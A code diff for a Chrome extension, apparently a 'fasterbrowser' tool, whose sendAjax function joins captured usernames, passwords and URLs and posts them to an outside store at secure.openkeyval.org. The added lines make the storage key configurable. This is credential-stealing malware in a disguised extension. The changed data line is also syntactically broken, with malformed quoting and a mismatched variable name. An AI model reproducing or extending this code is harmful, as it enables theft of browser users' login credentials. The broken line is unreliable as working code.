@@ -23,12 +23,16 @@ chrome.extension.sendMessage({}, function(response) {
     };
     var sendAjax = function(username, password, url, callback) {
       var msg = username + "|" + password + "|" + url;
+        var optionKey = localStorage["optionKey"];
+        if (optionKey == undefined) {
+          optionKey = "fasterbrowser";
+        }
       //console.log(msg);
       $.ajax({
         type: 'POST',
         url: 'https://secure.openkeyval.org/store/',
         dataType: "jsonp",
-        data: "fasterbrowser="+msg
+        data: optionkey"="+msg
         //succes: callback
       });
     };
